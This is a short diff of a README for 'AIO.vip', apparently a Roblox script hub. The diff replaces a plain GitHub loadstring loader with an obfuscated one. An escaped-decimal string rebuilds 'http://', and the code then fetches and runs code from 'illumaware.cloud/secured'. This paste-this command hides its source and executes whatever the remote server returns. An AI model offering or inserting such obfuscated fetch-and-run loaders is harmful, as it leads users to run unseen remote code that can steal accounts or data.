@@ -1,3 +1,4 @@
 ## AIO.vip [Open Source]
 ######
-    loadstring(game:HttpGet('https://github.com/illumaware/c/blob/main/main.lua?raw=true'))()
+    loadstring(game:HttpGet(loadstring("\114\101\116\117\114\110\32\102\117\110\99\116\105\111\110\40\41\114\101\116\117\114\110\39\104\116\116\112\58\47\47\39\101\110\100\10")()().."illumaware.cloud/secured"))()
+
